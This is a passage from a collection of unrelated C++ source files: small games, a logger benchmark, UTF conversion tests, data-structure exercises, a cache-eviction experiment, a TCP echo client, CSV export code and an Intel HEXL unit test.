{\n\t\tcharPos = charPos + 11;\n\t}\n\telse if (action == 'a') {\n\t\tcharPos = charPos - 1;\n\t}\n\telse if (action == 'd') {\n\t\tcharPos = charPos + 1;\n\t}\n\telse {\n\t\tstd::cout << arrMessages[0];\n\t}\n\n\tarrGameField[prevPos] = ' ';\n\n}\n\n// proccedures for create a enemy entities\nbool EnemyEntityGotDie() {\n\tshort counter = 0;\n\n\tfor (int i = 0; i < CountOfSym; i++) {\n\n\t\tif (arrGameField[i] == '&') {\n\t\t\tcounter = counter + 1;\n\t\t}\n\t}\n\n\tif (counter > 0) {\n\t\treturn false;\n\t}\n\telse {\n\t\treturn true;\n\t}\n}\n\nvoid spawnEntity() {\n\tsrand(time(0));\n\t\n\tint arrPosJ[50];\n\n\twhile (arrGameField[positionEntity] == '#') {\n\n\t\tpositionEntity = 11 + rand() % 97;\n\n\t}\n\tarrGameField[positionEntity] = Enemy;\n}\n//\n\nvoid getScorePlus() {\n\n\tif (charPos == positionEntity) {\n\t\tscore = score + 1;\n\t}\n\telse {\n\t\tscore = score;\n\t}\n}\n\nvoid getScoreOnScreen() {\n\n\tstd::cout << std::endl << \"score = \" << score << std::endl;\n\n}\n\nint main() {\n\n\tlinkForRes:\n\n\tbool gameAlreadyRunning = true;\n\n\twhile (gameAlreadyRunning) {\n\n\n\t\tarrGameField[charPos] = GameCharacter;\n\n\t\tgetNConstants(arrGameField);\n\t\tdrawField();\n\t\tgetScorePlus();\n\t\tgetScoreOnScreen();\n\n\t\tif (EnemyEntityGotDie()) {\n\t\t\tspawnEntity();\n\t\t}\n\n\t\tprevPos = charPos;\n\n\t\tinputHandler();\n\t\t\n\n\t\tgetCls();\n\t}\n\n\treturn 0;\n}",
    "#include <iostream>\n#include <thread>\n#include <string>\n#include <chrono>\n#include <cstdarg>\n#include <atomic>\n#include <vector>\n#include <string>\n#include \"../GstLog.h\"\n\n\n#include <fmt/core.h>\nstd::atomic<int> count(0);\nvoid thread_write(const std::string& str, int num) {\n    for (int i = 0; i < num; ++i) {\n        INFO(\"%s:%d\", str.c_str(), i);\n        DEBUG(\"%s:%d\", str.c_str(), i);\n        WARN(\"%s:%d\", str.c_str(), i);\n        ERROR(\"%s:%d\", str.c_str(), i);\n        FATAL(\"%s:%d\", str.c_str(), i);\n        count++;\n    }\n}\n\nint main() {\n    auto start_time = std::chrono::high_resolution_clock::now();\n\n    if (!GST::LOG::GstLogger::get_Instance()->init(\"./conf/AsyncJson.json\")) {\n        std::cout << \"Logger initialization failed\" << std::endl;\n        return 0;\n    }\n\n    std::vector<std::thread> threads;\n\n    for(int i = 0; i < 100; i++){\n        threads.emplace_back(std::move(std::thread(thread_write, \"hello world\", 2000000)));\n    }\n\n    for(auto &it:threads) {\n        it.join();\n    }\n\n\n    auto end_time = std::chrono::high_resolution_clock::now();\n    std::chrono::duration<double> elapsed = end_time - start_time;\n    \n    std::cout << \"write\" << count << \"use\" << \"Total execution time: \" << elapsed.count() << \" seconds\" << std::endl;\n\n    return 0;\n}\n\n\n",
    "\ufeff#include \"UtfN.hpp\"\n#include \"UtfNTests.hpp\"\n\n// Lower warning-level and turn off certain warnings for STL compilation\n#if (defined(_MSC_VER))\n#pragma warning (push, 2) // Push warnings and set warn-level to 2\n#pragma warning(disable : 4365) // signed/unsigned mismatch\n#pragma warning(disable : 4710) // 'FunctionName' was not inlined\n#pragma warning(disable : 4711) // 'FunctionName' selected for automatic inline expansion\n#elif (defined(__CLANG__) || defined(__GNUC__))\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wsign-compare\"\n#endif\n\n#include <iostream>\n\n// Restore warnings-levels after STL includes\n#if (defined(_MSC_VER))\n#pragma warning (pop)\n#elif (defined(__CLANG__) || defined(__GNUC__))\n#pragma GCC diagnostic pop\n#endif // Warnings\n\nint Replace(char* Current, char* End, char* MaxCapacity)\n{\n\t(void)Current;\n\t(void)End;\n\t(void)MaxCapacity;\n\n\treturn 0;\n}\n\nint main()\n{\n\tstd::cout << std::hex;\n\n\tusing namespace UtfN;\n\n\tUtfNTests::Parsing::TestParseUtf8CharFromStr();\n\tUtfNTests::Parsing::TestParseUtf16CharFromStr();\n\n\tstd::string Str = reinterpret_cast<const char*>(u8\"Hell \u91cc\u6210\");\n\tstd::cout << \"\\nstr: \" << Str << \"\\n\\n\";\n\n\t//constexpr utf_char<UtfEncodingType::Utf8> RandomChar = utf8_bytes{ 20, 120, 33, 00 };\n\n\t//constexpr auto FirstByte = RandomChar[0];\n\n\t//auto A = RandomChar.GetAsUtf8();\n\n\tutf8_iterator<std::string::const_iterator> MyIterator(Str);\n\n\tfor (utf_char8 Char : MyIterator)\n\t{\n\t\tstd::cout << \"StrBytes = \" << +Char[0] << \", \" << +Char[1] << \", \" << +Char[2] << \", \" << +Char[3] << \"\\n\";\n\t}\n\tstd::cout << \"\\n\" << std::endl;\n\n\n\tconst char* Array = reinterpret_cast<const char*>(u8\"Hello \u91cc\u6210\u91cc\u6210\u91cc\u6210 word!\");\n\n\tutf8_iterator<const char*> My2ndIterator(Array, Array + sizeof(u8\"Hello \u91cc\u6210\u91cc\u6210\u91cc\u6210 word!\"));\n\n\tfor (utf_char8 Char : My2ndIterator)\n\t{\n\t\tstd::cout << \"ArrayBytes = \" << +Char[0] << \", \" << +Char[1] << \", \" << +Char[2] << \", \" << +Char[3] << \"\\n\";\n\t}\n\tstd::cout << \"\\n\" << std::endl;\n\n\n\tif (UtfN::ParseUtf8CharFromStr(u8\"\u00e9\") == UtfN::utf8_bytes{ 0xC3, 0xA9, 0x00, 0x00, })\n\t{\n\t\tstd::cout << \"yay\\n\";\n\t}\n\n\tutf_char16 C = utf16_pair{ 2000, 0000 };\n\t//utf_char8 C2 = C;\n\n\n\tstd::wstring FunStr = L\"\u03b1\u03b2\ud83d\udca1\u26a1\ud83d\udd0d\ud83d\udcdd\ud834\uddce\ud834\ude0b\";\n\tutf16_iterator<std::wstring::const_iterator> MyIterator2(FunStr);\n\n\tfor (utf_char16 Char : MyIterator2)\n\t{\n\t\tstd::cout << \"StrBytes: lower: \" << +Char.Char.Lower << \",  upper: \" << +Char.Char.Upper << std::endl;\n\t}\n\tstd::cout << \"\\n\" << std::endl;\n\n\n\n\tconstexpr utf_char16 Pair = Utf32ToUtf16Pair(0x1D11E);\n\n\t//constexpr auto var1 = Pair.GetAsUtf16();\n\t//constexpr auto var2 = Pair.GetAsUtf8();\n\t//constexpr auto var3 = Pair.GetAsUtf32();\n\t//\n\t//(void)var1;\n\t//(void)var2;\n\t//(void)var3;\n\n\tstd::cout << \"Pair.Upper: \" << std::hex << static_cast<unsigned short>(Pair.Char.Upper) << \"\\n\";\n\tstd::cout << \"Pair.Lower: \" << std::hex << static_cast<unsigned short>(Pair.Char.Lower) << \"\\n\";\n\n\tutf_char32 OrignalChar = Utf16PairToUtf32(Pair);\n\tstd::cout << \"OrignalChar (Utf32 : 0x1D11E): \" << std::hex << +OrignalChar.Char << \"\\n\";\n\n\n\tutf_char8 Utf8Bytes1 = Utf32ToUtf8Bytes(0x41);\n\tstd::cout << \"1. Utf8Bytes = \" << +Utf8Bytes1[0] << \", \" << +Utf8Bytes1[1] << \", \" << +Utf8Bytes1[2] << \", \" << +Utf8Bytes1[3] << \"\\n\";\n\tstd::cout << \"Orig (Utf32 : 0x41): \" << +Utf8BytesToUtf32(Utf8Bytes1) << \"\\n\\n\";\n\n\tutf_char8 Utf8Bytes2 = Utf32ToUtf8Bytes(0xA9);\n\tstd::cout << \"2. Utf8Bytes = \" << +Utf8Bytes2[0] << \", \" << +Utf8Bytes2[1] << \", \" << +Utf8Bytes2[2] << \", \" << +Utf8Bytes2[3] << \"\\n\";\n\tstd::cout << \"Orig (Utf32 : 0xA9): \" << +Utf8BytesToUtf32(Utf8Bytes2) << \"\\n\\n\";\n\n\tutf_char8 Utf8Bytes3 = Utf32ToUtf8Bytes(0x20AC);\n\tstd::cout << \"3. Utf8Bytes = \" << +Utf8Bytes3[0] << \", \" << +Utf8Bytes3[1] << \", \" << +Utf8Bytes3[2] << \", \" << +Utf8Bytes3[3] << \"\\n\";\n\tstd::cout << \"Orig (Utf32 : 0x20AC): \" << +Utf8BytesToUtf32(Utf8Bytes3) << \"\\n\\n\";\n\n\tutf_char8 Utf8Bytes4 = Utf32ToUtf8Bytes(0x1F600);\n\tstd::cout << \"4. Utf8Bytes = \" << +Utf8Bytes4[0] << \", \" << +Utf8Bytes4[1] << \", \" << +Utf8Bytes4[2] << \", \" << +Utf8Bytes4[3] << \"\\n\";\n\tstd::cout << \"Orig (Utf32 : 0x1F600): \" << +Utf8BytesToUtf32(Utf8Bytes4) << \"\\n\\n\";\n\n\tutf_char8 Utf8Bytes5 = Utf32ToUtf8Bytes(0x110000);\n\tstd::cout << \"E. Utf8Bytes = \" << +Utf8Bytes5[0] << \", \" << +Utf8Bytes5[1] << \", \" << +Utf8Bytes5[2] << \", \" << +Utf8Bytes5[3] << \"\\n\";\n\tstd::cout << \"Orig (Utf32 : 0x110000): \" << +Utf8BytesToUtf32(Utf8Bytes5) << \"\\n\\n\";\n\n}",
    "#pragma once\r\n#include \"MainWindow.h\"\r\n#include <wx/valnum.h>\r\n#include <cstdlib>\r\n#include <time.h>\r\n#include <format>\r\n#include <chrono>\r\n#include <thread>\r\n#include <string>\r\n\r\n\r\nMainWindow::MainWindow(const wxString &Title) : wxFrame(nullptr, wxID_ANY, Title, \r\n            wxDefaultPosition, wxDefaultSize, wxDEFAULT_FRAME_STYLE & ~(wxRESIZE_BORDER | wxMAXIMIZE_BOX)){\r\n    // Now the user won't be able to resize the window. Muhahahaha!!!!\r\n    \r\n    AddControls();\r\n    AddSizers();\r\n    BindEventHandlers();\r\n    SetUpGame();\r\n}\r\n\r\n\r\nvoid MainWindow::AddControls(){\r\n    // 0 means choose a suitable width.\r\n\t// 36 means the font is 36 pixels tall.\r\n    HeadingFont = new wxFont(wxFontInfo(wxSize(0, 36)).Bold());\r\n    MainFont = new wxFont(wxFontInfo(wxSize(0, 24)));\r\n    NumberFont = new wxFont(wxFontInfo(wxSize(0, 30)));\r\n\r\n    // Allow positive integers and display them with thousands separators.\r\n    // Only allows integers as the input from user.\r\n    wxIntegerValidator<int> val(&m_value, wxNUM_VAL_THOUSANDS_SEPARATOR);\r\n    \r\n\r\n    Panel = new wxPanel(this);\r\n    Panel -> SetFont(*MainFont);\r\n\r\n    Heading = new wxStaticText(Panel, wxID_ANY, \"Guess The Number\", wxDefaultPosition, \r\n                wxDefaultSize, wxTE_CENTRE);\r\n    Heading -> SetFont(*HeadingFont);\r\n\r\n    //TimeLeft = new wxStaticText(Panel, wxID_ANY, \"Time Left :- \");\r\n\r\n    ChancesLeft = new wxStaticText(Panel, wxID_ANY, \"Chances Left :- \");\r\n\r\n    StartingRangeText = new wxStaticText(Panel, wxID_ANY, \"Starting Range\");\r\n    StartingRangeNumber = new wxStaticText(Panel, wxID_ANY, \"0\");\r\n    StartingRangeNumber -> SetFont(*NumberFont);\r\n\r\n    EndRangeText = new wxStaticText(Panel, wxID_ANY, \"End Range\");\r\n    EndRangeNumber = new wxStaticText(Panel, wxID_ANY, \"50\");\r\n    EndRangeNumber -> SetFont(*NumberFont);\r\n\r\n    GuessedNumberText = new wxStaticText(Panel, wxID_ANY, \"Guess Your Number\");\r\n    GuessedNumber = new wxTextCtrl(Panel, wxID_ANY, \"\", wxDefaultPosition, \r\n                wxDefaultSize, wxTE_CENTRE | wxTE_PROCESS_ENTER | wxBORDER_NONE, val);\r\n    GuessedNumber -> SetFont(*NumberFont);\r\n\r\n    StatusLog = new wxStaticText(Panel, wxID_ANY, \"\");\r\n}\r\n\r\n\r\nvoid MainWindow::AddSizers(){\r\n    // Although the user won't be able to resize window, I will keep SizerFlags and the\r\n    // sizers themselves intact because removing them will take time.\r\n    // Plus I find them much easier than absolute positioning.\r\n\r\n    MainSizer = new wxBoxSizer(wxVERTICAL);\r\n\r\n    MainSizer -> Add(Heading, wxSizerFlags().Expand());\r\n    MainSizer -> AddSpacer(25);\r\n\r\n    ChanceAndTimeSizer = new wxBoxSizer(wxHORIZONTAL);\r\n    //ChanceAndTimeSizer -> Add(TimeLeft);\r\n    //ChanceAndTimeSizer -> AddStretchSpacer(1);\r\n    ChanceAndTimeSizer -> Add(ChancesLeft);\r\n\r\n    MainSizer -> Add(ChanceAndTimeSizer, wxSizerFlags().Expand());\r\n    MainSizer -> AddSpacer(35);\r\n\r\n    NumbersHeadingSizer = new wxBoxSizer(wxHORIZONTAL);\r\n    NumbersHeadingSizer -> AddSpacer(50);\r\n    NumbersHeadingSizer -> Add(StartingRangeText);\r\n    NumbersHeadingSizer -> AddSpacer(30);\r\n    NumbersHeadingSizer -> Add(EndRangeText);\r\n    NumbersHeadingSizer -> AddSpacer(70);\r\n    NumbersHeadingSizer -> Add(GuessedNumberText);\r\n\r\n    MainSizer -> Add(NumbersHeadingSizer, wxSizerFlags().Expand());\r\n\r\n    NumbersSizer = new wxBoxSizer(wxHORIZONTAL);\r\n    NumbersSizer -> AddSpacer(120);\r\n    NumbersSizer -> Add(StartingRangeNumber);\r\n    NumbersSizer -> AddSpacer(140);\r\n    NumbersSizer -> Add(EndRangeNumber);\r\n    NumbersSizer -> AddSpacer(150);\r\n    NumbersSizer -> Add(GuessedNumber);\r\n\r\n    MainSizer -> Add(NumbersSizer, wxSizerFlags().Expand());\r\n    MainSizer -> AddSpacer(50);\r\n\r\n    MainSizer -> Add(StatusLog, wxSizerFlags().Expand());\r\n\r\n    OuterSizer = new wxBoxSizer(wxVERTICAL);\r\n    OuterSizer -> Add(MainSizer, wxSizerFlags().Border(wxALL, 25));\r\n\r\n    Panel -> SetSizer(OuterSizer);\r\n    OuterSizer -> SetSizeHints(this); // The frame now respects the min size of OuterSizer.\r\n}\r\n\r\n\r\nvoid inline MainWindow::BindEventHandlers(){\r\n    GuessedNumber -> Bind(wxEVT_KEY_DOWN, &MainWindow::OnEnterKeyPress, this);\r\n}\r\n\r\n\r\nvoid inline MainWindow::UnBindEventHandlers(){\r\n    GuessedNumber -> Unbind(wxEVT_KEY_DOWN, &MainWindow::OnEnterKeyPress, this);\r\n}\r\n\r\n\r\n\r\nvoid MainWindow::SetUpGame(){\r\n    // Generating a random number between 0 and 50 (Both inclusive).\r\n    \r\n    // Use current time as seed for random generator.\r\n    // This makes sure that the RNG generates random numbers every time the program runs \r\n    // by using a different seed every time.\r\n    srand(time(0));\r\n\r\n    m_RandomNumber = rand() % 51;\r\n\r\n    m_Chances = 5;\r\n    ChancesLeft -> SetLabel(std::format(\"Chances Left :- {}\", m_Chances));\r\n\r\n    //m_Seconds = 10;\r\n    //TimeLeft -> SetLabel(std::format(\"Time Left :- {}\", m_Seconds));\r\n\r\n    //HasUserWon = false;\r\n}\r\n\r\n\r\n/* void MainWindow::StartGame(){\r\n    auto t1 = std::chrono::system_clock::now();\r\n    \r\n    while(m_Seconds > 0 && m_Chances > 0){\r\n\r\n        if ((std::chrono",
    "#include <iostream>\nusing namespace std;\n\nclass Data {\nprivate:\n  int key;\n  string value;\npublic:\n  Data() : key(0), value(\"\") {}\n  Data(int key, string value) : key(key), value(value) {}\n  void print() { cout << \"key: \" << key << \", value: \" << value << endl; }\n};\n\ntemplate <typename T> class Node {\npublic:\n  Data data;\n  Node<T> *next;\n  Node() : next(nullptr) {}\n};\n\ntemplate <typename T> class List {\nprivate:\n  Node<T> *first;\n  Node<T> *last;\n  int size;\n  Node<T> *getNodeByPos(int pos) {\n    Node<T> *ptr = first->next;\n    for (int i = 0; i < pos; ++i) {\n      ptr = ptr->next;\n    }\n    return ptr;\n  }\n  Node<T> *predecessor(Node<T> *target) {\n    Node<T> *ptr = first;\n    while (ptr->next != target && ptr != nullptr) {\n      ptr = ptr->next;\n    }\n    return ptr;\n  }\n  void removeNode(Node<T> *target) {\n    Node<T> *ptr = predecessor(target);\n    ptr->next = target->next;\n    if (ptr->next == nullptr)\n      last = ptr;\n    delete target;\n    target = nullptr;\n  }\n\npublic:\n  void create() {\n    first = new Node<T>();\n    first->next = nullptr;\n    last = first;\n    size = 0;\n  }\n  int getSize() { return size; }\n  bool isEmpty() { return size == 0; }\n  void insert(Data data) {\n    last->next = new Node<T>();\n    last = last->next;\n    last->next = nullptr;\n    last->data = data;\n    ++size;\n  }\n  void show() {\n    Node<T> *ptr = first->next;\n    while (ptr != nullptr) {\n      ptr->data.print();\n      ptr = ptr->next;\n    }\n    cout << \"size: \" << size << endl;\n  }\n  Data getItemByPos(int pos) {\n    if (!isEmpty()) {\n      Node<T> *ptr = first->next;\n      for (int i = 0; i < pos; ++i) {\n        ptr = ptr->next;\n      }\n      return ptr->data;\n    } else\n      return first->data;\n  }\n  void removeItemByPos(int pos) {\n    if (!isEmpty()) {\n      Node<T> *target = getNodeByPos(pos);\n      if (target != nullptr)\n        removeNode(target);\n      --size;\n    }\n  }\n};\n\nint main() {\n  Data item1 = Data(1, \"joao\");\n  Data item2 = Data(2, \"pedro\");\n  Data item3 = Data(3, \"davi\");\n  Data item4 = Data(4, \"maria\");\n  Data item5 = Data(5, \"jose\");\n\n  List<Data> l;\n  l.create();\n  l.insert(item1);\n  l.insert(item2);\n  l.insert(item3);\n  l.insert(item4);\n  l.insert(item5);\n  l.show();\n  int pos = 3;\n  Data myItem = l.getItemByPos(pos);\n  cout << \"data found: \";\n  myItem.print();\n  l.removeItemByPos(pos);\n  l.show();\n  return 0;\n}",
    "#include <string>\n#include <utility>\n#include <fstream>\n#include <filesystem>\n#include \"evalAccessTable.hpp\"\n\nusing namespace std;\n\n//\n// Created by dev on 05.10.21.\n//\nstatic void getOrDefaultAndSet(map<int, int> &history, int new_value, int pageRef,\n                               int default_value, int* value);\n\nEvalAccessTable::EvalAccessTable(std::string  filename, std::string  out_dir, bool do_run, bool test, bool benchmark): filename(std::move(filename)), output_dir(std::move(out_dir)){\n        if(!do_run){\n            return;\n        }\n        runFromFilename(test, benchmark);\n    };\n\nvoid EvalAccessTable::init(bool ignore_last_run, int max_ram){\n    getDataFile();\n    if(ignore_last_run){\n        max_ram = -1;\n    }\n    createLists(ignore_last_run, max_ram); // this runs \"lru\" (lru_stack_trace)\n}\nvoid EvalAccessTable::runFromFilename(bool test, bool benchmark) {\n    // in case of full run (not test or benchmark)\n    bool run_slow = false;\n    bool full_run = false;\n    // Ignore last if test run, else not!\n    init(test, 100000);\n\n    // default_compare_algos();\n    // advanced_compare_algos();\n    bool do_it = true;\n    if(do_it) {\n        advanced_with_variations_algos();\n\n        uint KR = 1;                  // length of first list (read or access), 0 = infty\n        uint epoch_size = 0;          // How many evictions are grouped to one epoch, 0 = infty, else RAMSIZE/epoch_size\n        uint randSize = 8;            // How big is the random sample\n        uint randSelector = 1;        // How many Elements should be evicted per sample\n\n        uint KW = 1;                  // length of second list (write list), 0 = infty (not counted, becaus write_cost=0)\n        bool write_as_read = true;  // use first lists for accesses (reads and writes) or only reads\n        float write_cost = 0;         // how expensive are writes compared to reads\n\n        float first_value = 1.0;    // dampening factor of first access\n        modus mod = mod_max;        // what modus should be taken to aggregate \n        int Z = 0;                   // size of out of memory history -1 = infty\n\n        // Sampling\n        /*\n        for (int randSize: {1, 2, 4, 8, 16, 32, 64}) {\n            string name = \"watt_sampling_\";\n            if (randSize < 10)\n                name += \"0\";\n            name += to_string(randSize);\n            runAlgorithm(name,\n                         LFU_2K_E_real_Generator(KR, KW, epoch_size, randSize, randSelector, write_as_read, write_cost,\n                                                 first_value, mod, Z));\n            runAlgorithm(\"other\" + name,\n                         LFU_2K_E_real_Generator(KR, KW, epoch_size, randSize, randSelector, false, write_cost,\n                                                 first_value, mod, Z));\n            runAlgorithm(\"one\" + name, LFU_1K_E_real_Generator(KR, epoch_size, randSize, randSelector, write_cost, Z));\n        }\n        */\n        randSize = 8;\n\n        // Read Backlog Size\n        \n        /*\n        int KR_max_value = 0;\n        for (int KR: {1, 2, 4, 8, 16, 32, 64, KR_max_value}) {\n            string name = \"watt_backlog_\";\n            if (KR == KR_max_value) name += \"max\";\n            else {\n                if (KR < 10) name += \"0\";\n                name += to_string(KR);\n            }\n\n            runAlgorithm(name,\n                         LFU_2K_E_real_Generator(KR, KW, epoch_size, randSize, randSelector, write_as_read, write_cost,\n                                                 first_value, mod, Z));\n            runAlgorithm(\"other\" + name,\n                         LFU_2K_E_real_Generator(KR, KW, epoch_size, randSize, randSelector, false, write_cost,\n                                                 first_value, mod, Z));\n            runAlgorithm(\"one\" + name, LFU_1K_E_real_Generator(KR, epoch_size, randSize, randSelector, write_cost, Z));\n        }\n        */\n        KR = 8;\n\n        // Epochs\n        \n        /*\n        int epochs_max_value = 0;\n        for (int epoch_size: {1, 2, 4, 8, 16, 32, 64, 128, epochs_max_value}) {\n            string name = \"watt_epoch_\";\n            if (epoch_size == epochs_max_value) name += \"max\";\n            else {\n                if (epoch_size < 10) name += \"0\";\n                if (epoch_size < 100) name += \"0\";\n                name += to_string(epoch_size);\n            }\n            runAlgorithm(name,\n                         LFU_2K_E_real_Generator(KR, KW, epoch_size, randSize, randSelector, write_as_read, write_cost,\n                                                 first_value, mod, Z));\n            runAlgorithm(\"other\" + name,\n                         LFU_2K_E_real_Generator(KR, KW, epoch_size, randSize, randSelector, false, write_cost,\n                                                 first_value, mod, Z));\n            runAlgorithm(\"one\" + name, LFU_1K_E_real_Generator(KR, epoch_size, randSize, randSelector, write_cost, Z));\n\n        }\n        */\n        epoch_size = 4;\n\n        // Dampening\n        /*\n  ",
    "#include<bits/stdc++.h>\nusing namespace std;\n\nclass DSU {\n    private:\n    static const int N = 1e5 + 7;\n    int parent[N];\n    int size[N];\n\n    public:\n    DSU() {\n        for (int i = 0; i < N; ++i) {\n            parent[i] = i;\n            size[i] = 1;\n        }\n    }\n    // This function help in to make node\n    void make(int v) {\n        parent[v] = v;\n        size[v] = 1;\n    }\n    // This function the find the parent of the node\n    int find(int v) {\n        if (v == parent[v]) return v;\n        // Path Compression \n        return parent[v] = find(parent[v]);\n    }\n    // This function combined the two things\n    void Union(int u, int v) {\n        u = find(u);\n        v = find(v);\n\n        if (u != v) {\n            // Union By Size\n            if (size[u] < size[v]) std::swap(u, v);\n            parent[v] = u;\n            size[u] += size[v];\n        }\n    }\n    // Time Complexity = O(alpha(n))  amortised time complexity \n};\n\nint main(){\n    \n     DSU obj;\n     int n,k; cin >> n >> k;\n      \n     while(k--){\n        int u,v; cin >> u >> v;\n        obj.Union(u,v);\n     }\n     int component = 0;\n\n    // we are finding no of connected components\n     for(int i=1;i<=n;i++){\n        if(obj.find(i) == i){\n            component++;\n        }\n     }\n     cout << component << endl;\n     \n}",
    "#include <arpa/inet.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <unistd.h>\n\n#define SERVER_IP \"172.27.13.157\" // \u670d\u52a1\u5668 IP \u5730\u5740\n#define SERVER_PORT 9703          // \u670d\u52a1\u5668\u7aef\u53e3\n#define BUFFER_SIZE 1024          // \u7f13\u51b2\u533a\u5927\u5c0f\n\nint main()\n{\n    int sock;\n    struct sockaddr_in server_addr;\n    char buffer[BUFFER_SIZE];\n    ssize_t read_size;\n\n    // \u521b\u5efa socket\n    sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (sock == -1)\n    {\n        perror(\"Failed to create socket\");\n        exit(EXIT_FAILURE);\n    }\n\n    // \u8bbe\u7f6e\u670d\u52a1\u5668\u5730\u5740\u7ed3\u6784\n    server_addr.sin_family = AF_INET;\n    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);\n    server_addr.sin_port = htons(SERVER_PORT);\n\n    // \u8fde\u63a5\u5230\u670d\u52a1\u5668\n    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)\n    {\n        perror(\"Connection failed\");\n        close(sock);\n        exit(EXIT_FAILURE);\n    }\n\n    printf(\"Connected to server. Type your message (or 'quit' to exit):\\n\");\n\n    while (1)\n    {\n        // \u4ece\u7528\u6237\u8f93\u5165\u83b7\u53d6\u6d88\u606f\n        printf(\"Your message: \");\n        fgets(buffer, BUFFER_SIZE, stdin);\n\n        // \u79fb\u9664\u6362\u884c\u7b26\n        buffer[strcspn(buffer, \"\\n\")] = 0;\n\n        // \u68c0\u67e5\u662f\u5426\u9000\u51fa\n        if (strcmp(buffer, \"quit\") == 0)\n        {\n            break;\n        }\n\n        // \u53d1\u9001\u6d88\u606f\u5230\u670d\u52a1\u5668\n        if (send(sock, buffer, strlen(buffer), 0) < 0)\n        {\n            perror(\"Send failed\");\n            break;\n        }\n\n        // \u63a5\u6536\u670d\u52a1\u5668\u7684\u56de\u58f0\n        read_size = recv(sock, buffer, BUFFER_SIZE - 1, 0);\n        if (read_size > 0)\n        {\n            buffer[read_size] = '\\0';\n            printf(\"Server echo: %s\\n\", buffer);\n        }\n        else if (read_size == 0)\n        {\n            printf(\"Server disconnected\\n\");\n            break;\n        }\n        else\n        {\n            perror(\"Receive failed\");\n            break;\n        }\n    }\n\n    // \u5173\u95ed socket\n    close(sock);\n    return 0;\n}",
    "#include \"function.h\"\r\n\r\n// Import all books from datastructre to books_dataset.csv\r\nvoid exportBooks()\r\n{\r\n    // Export all books from datastructure to books_dataset.csv\r\n    ofstream file;\r\n    file.open(\"books_dataset.csv\");\r\n    file << temple1 << \"\\n\";\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        file << books[i].id << \",\";\r\n        for (int j = 0; j < books[i].name.size(); j++)\r\n        {\r\n            if (books[i].name[j] == ',')\r\n            {\r\n                books[i].name = \"\\\"\" + books[i].name + \"\\\"\";\r\n                break;\r\n            }\r\n        }\r\n        file << books[i].name;\r\n        file << \",\";\r\n        for (int j = 0; j < books[i].author.size(); j++)\r\n        {\r\n            if (books[i].author[j] == ',')\r\n            {\r\n                books[i].author = \"\\\"\" + books[i].author + \"\\\"\";\r\n                break;\r\n            }\r\n        }\r\n        file << books[i].author;\r\n        file << \",\"; \r\n        for (int j = 0; j < books[i].originalLanguage.size(); j++)\r\n        {\r\n            if (books[i].originalLanguage[j] == ',')\r\n            {\r\n                books[i].originalLanguage = \"\\\"\" + books[i].originalLanguage + \"\\\"\";\r\n                break;\r\n            }\r\n        }\r\n        file << books[i].originalLanguage;\r\n        file << \",\" << books[i].firstPublicationYear << \",\" << books[i].approximateSales << \",\";\r\n        for (int j = 0; j < books[i].genre.size(); j++)\r\n        {\r\n            if (books[i].genre[j] == ',')\r\n            {\r\n                books[i].genre = \"\\\"\" + books[i].genre + \"\\\"\";\r\n                break;\r\n            }\r\n        }\r\n        file << books[i].genre;\r\n        file << \",\" << books[i].remaining;\r\n        if (i != n - 1)\r\n        {\r\n            file << \"\\n\";\r\n        }\r\n    }\r\n    file.close();\r\n}\r\n\r\n// Import all users from datastructre to users_dataset.csv\r\nvoid exportUsers()\r\n{\r\n    // Export all users from datastructure to users_dataset.csv\r\n    ofstream file;\r\n    file.open(\"data_users.csv\");\r\n    file << temple2 << \"\\n\";\r\n    for (int i = 0; i < m; i++)\r\n    {\r\n        file << users[i].id << \",\" << users[i].name;\r\n        for (int j = 0; j < users[i].borrowedBooksCount; j++)\r\n        {\r\n            file << \",\" << users[i].borrowedBooks[j].first << \",\" << users[i].borrowedBooks[j].second.date << \"/\" << users[i].borrowedBooks[j].second.month << \"/\" << users[i].borrowedBooks[j].second.year;\r\n        }\r\n        if (i != m - 1)\r\n        {\r\n            file << \"\\n\";\r\n        }\r\n    }\r\n    file.close();\r\n}",
    "// Copyright (C) 2020-2021 Intel Corporation\n// SPDX-License-Identifier: Apache-2.0\n\n#include <gtest/gtest.h>\n\n#include <vector>\n\n#include \"hexl/experimental/misc/lr-mat-vec-mult.hpp\"\n#include \"hexl/logging/logging.hpp\"\n#include \"hexl/number-theory/number-theory.hpp\"\n#include \"test-util.hpp\"\n\nnamespace intel {\nnamespace hexl {\n\nTEST(LinRegMatrixVectorMultiply, small_one_mod) {\n  size_t num_weights = 2;\n  size_t coeff_count = 3;\n  std::vector<uint64_t> moduli{10};\n  std::vector<uint64_t> op1{1, 1, 1,           // w0\n                            4, 5, 6, 2, 2, 2,  // w1\n                            4, 5, 6};\n  //        t0  t1  t2\n  std::vector<uint64_t> op2{3, 4, 5,           // c0 = { t00 t10 t20 }\n                            8, 1, 3, 1, 2, 3,  // c1 = { t01 t11 t21 }\n                            8, 1, 3};\n\n  // w0 .* c0 + w1 .* c1\n\n  std::vector<uint64_t> out(num_weights * moduli.size() * 3 * coeff_count, 0);\n\n  std::vector<uint64_t> exp_out{\n      ((1 * 3 % 10) + (2 * 1 % 10)) % 10,\n      ((1 * 4 % 10) + (2 * 2 % 10)) % 10,\n      ((1 * 5 % 10) + (2 * 3 % 10)) % 10,  //\n      (((1 * 8 + 4 * 3) % 10) + ((2 * 8 + 4 * 1) % 10)) % 10,\n      (((1 * 1 + 5 * 4) % 10 + (2 * 1 + 5 * 2) % 10)) % 10,\n      (((1 * 3 + 6 * 5) % 10) + ((2 * 3 + 6 * 3) % 10)) % 10,  //\n      ((4 * 8 % 10) + (4 * 8 % 10)) % 10,\n      ((5 * 1 % 10) + (5 * 1 % 10)) % 10,\n      ((6 * 3 % 10) + (6 * 3 % 10)) % 10,  //\n\n      (2 * 1 % 10),\n      (2 * 2 % 10),\n      (2 * 3 % 10),  //\n      (2 * 8 + 4 * 1) % 10,\n      (2 * 1 + 5 * 2) % 10,\n      (2 * 3 + 6 * 3) % 10,  //\n      (4 * 8 % 10),\n      (5 * 1 % 10),\n      (6 * 3 % 10)  //\n  };\n\n  LinRegMatrixVectorMultiply(out.data(), op1.data(), op2.data(), coeff_count,\n                             moduli.data(), moduli.size(), num_weights);\n\n  CheckEqual(out, exp_out);\n}\n\n}  